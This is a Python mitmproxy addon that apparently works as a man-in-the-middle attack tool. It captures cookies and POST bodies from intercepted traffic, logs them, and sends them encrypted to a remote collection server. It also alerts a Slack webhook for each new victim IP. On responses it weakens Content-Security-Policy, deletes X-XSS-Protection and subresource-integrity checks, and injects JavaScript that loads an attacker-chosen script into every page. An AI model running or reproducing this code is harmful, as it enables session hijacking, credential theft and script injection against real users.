import requests
from mitmproxy import http
import os
import re
import json
import brotli
from bs4 import BeautifulSoup
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import base64

SLACK_WEBHOOK_URL = 'https://ADD_HERE'
KEY = base64.b64decode('YOUR_KEY')  
IV = base64.b64decode('YOUR_IV')
SERVER_URL = 'https://YOUR_ENDPOINT/server.php'

def encrypt(data):
    cipher = AES.new(KEY, AES.MODE_CBC, IV)
    padded_data = pad(data.encode(), AES.block_size)
    encrypted_data = cipher.encrypt(padded_data)
    return base64.b64encode(encrypted_data).decode('utf-8')

def send_data(ip, data):
    encrypted_data = encrypt(json.dumps(data))
    payload = json.dumps({'ip': ip, 'data': encrypted_data})
    headers = {'Content-Type': 'application/json'}
    response = requests.post(SERVER_URL, data=payload, headers=headers)
    if response.status_code != 200:
        print("Failed to send data to server: ", response.status_code)

def fetch_script_content(url):
    try:
        response = requests.get(url)
        response.raise_for_status()
        return response.text
    except requests.exceptions.RequestException as e:
        print(f"Error fetching script content: {e}")
        return ""

script_url = "https://gist.githubusercontent.com/drzhbe/fb34ff1dd975922e75481e2dbc162114/raw/9940cd037f2ae63a20c18274b680062896e8b40d/alert1.js" #just an example url with XSS
script_content = fetch_script_content(script_url)

logged_ips = set()

def send_slack_notification(message):
    data = {"text": message}
    response = requests.post(SLACK_WEBHOOK_URL, json=data)
    response.raise_for_status()

def write_immediately(log_type, message):
    log_path = os.path.join("/var/www/html/", f"{log_type}.log")
    with open(log_path, "a") as log_file:
        log_file.write(f"{message}\n\n")

def write_immediately2(log_type, message, user_agent):
    sanitized_user_agent = re.sub(r'\W+', '', user_agent)
    log_path = os.path.join("/home/ubuntu/logs", f"{log_type}_{sanitized_user_agent}.log")
    with open(log_path, "a") as log_file:
        log_file.write(f"{message}\n\n")


def log_data(client_ip, data):
    send_data(client_ip, data)

def split_cookies(cookie_header):
    cookies = []
    cookie_pairs = re.split(r'(?<!\\);\s*', cookie_header)
    for pair in cookie_pairs:
        name, value = pair.split('=', 1)
        cookies.append({'name': name.strip(), 'value': value.strip()})
    return cookies

def request(flow: http.HTTPFlow):
    flow.request.headers.pop('Accept-Encoding', None)
    client_ip = flow.client_conn.address[0].replace("::ffff:", "")
    user_agent = flow.request.headers.get("User-Agent", "unknown")

    if client_ip not in logged_ips:
        logged_ips.add(client_ip)
        send_slack_notification(f"New Connection! IP: {client_ip}")

    if "Cookie" in flow.request.headers:
        cookies = flow.request.headers.get("Cookie", "")
        cookies_data = split_cookies(cookies)
        log_data(client_ip, {'url': flow.request.pretty_url, 'cookies': cookies_data}, user_agent)
        write_immediately2(f'cookies_request_{client_ip}', json.dumps({'url': flow.request.pretty_url, 'cookies': cookies_data}), user_agent)

    if flow.request.method == "POST" and flow.request.content:
        post_data = flow.request.text
        write_immediately2(f'post_data_{client_ip}', json.dumps({'url': flow.request.pretty_url, 'post_data': post_data}), user_agent)

def response(flow):
    try:
        client_ip = flow.client_conn.address[0].replace("::ffff:", "")
        user_agent = flow.request.headers.get("User-Agent", "unknown")
        if "WHITELISTED_HOST" in flow.request.host:
            return

        if 'Permissions-Policy' in flow.response.headers:
            flow.response.headers.pop('Permissions-Policy', None)
        csp_header = flow.response.headers.get("Content-Security-Policy", "")

        policies_to_add = {
            "script-src": "* 'unsafe-inline' 'unsafe-eval' blob: data:",
            "script-src-elem": "* 'unsafe-inline' 'unsafe-eval' blob: data: https://WHITELISTED_HOST",
            "connect-src": "* blob: data:",
            "worker-src": "* blob: data:"
        }

        csp_directives = {}
        for directive in csp_header.split(';'):
            if directive.strip():
                key, _, value = directive.strip().partition(' ')
                csp_directives[key] = value

        for key, value in policies_to_add.items():
            csp_directives[key] = value

        new_csp = '; '.join([f"{key} {value}" for key, value in csp_directives.items()])
        flow.response.headers["Content-Security-Policy"] = new_csp
        flow.response.headers.pop("X-XSS-Protection", None)
        if "Set-Cookie" in flow.response.headers:
            set_cookies = flow.response.headers.get_all("Set-Cookie")
            cookies_data = [{'name': ck.partition('=')[0], 'value': ck.partition('=')[2].split(';')[0]} for ck in set_cookies]
            log_data(client_ip, {'url': flow.request.pretty_url, 'cookies': cookies_data})
            write_immediately2(f'cookies_response_{client_ip}', json.dumps({'url': flow.request.pretty_url, 'cookies': cookies_data}), user_agent)
            
        content_type = flow.response.headers.get("Content-Type", "")
        if content_type and ("application/javascript" in content_type or "text/javascript" in content_type):
            original_js = flow.response.content.decode('utf-8')
            modified_js = original_js
            matches = re.findall(r'(\w+\.integrity\s*=\s*"[^"]+";)', original_js)

            modified_js = re.sub(r'(\w+\.integrity\s*=\s*"[^"]+";)', r'// \1', original_js)
            if modified_js != original_js:
                pass
            else:
                injected_js = f"""
                if (!window.mdn1332) {{

                    function loadSentry() {{
                        var script = document.createElement('script');
                        script.src = 'YOUR_SCRIPT_JS_URL';
                        script.onload = function() {{
                            window.mdn1332 = true;
                        }};

                        document.body.appendChild(script);
                    }}

                    if (document.readyState === 'complete') {{
                        loadSentry();
                    }} else {{
                        window.addEventListener('load', loadSentry);
                    }}
                    }}
                    """
                modified_js = modified_js + injected_js
            flow.response.content = modified_js.encode('utf-8')

        if "text/html" in content_type:
            html_content = flow.response.content.decode('utf-8')
            soup = BeautifulSoup(html_content, 'html.parser')

            for script_tag in soup.find_all('script'):
                if script_tag.get('src') and script_tag.get('integrity'):
                    del script_tag['integrity']

                if script_tag.string:
                    script_code = script_tag.string
                    modified_script_code = re.sub(r'\s*\w+\.integrity\s*=\s*"[^"]+";\s*', '', script_code)
                    script_tag.string = modified_script_code

            flow.response.content = str(soup).encode('utf-8')
    except Exception as e:
        print(f"Error processing response: {e}")
        pass

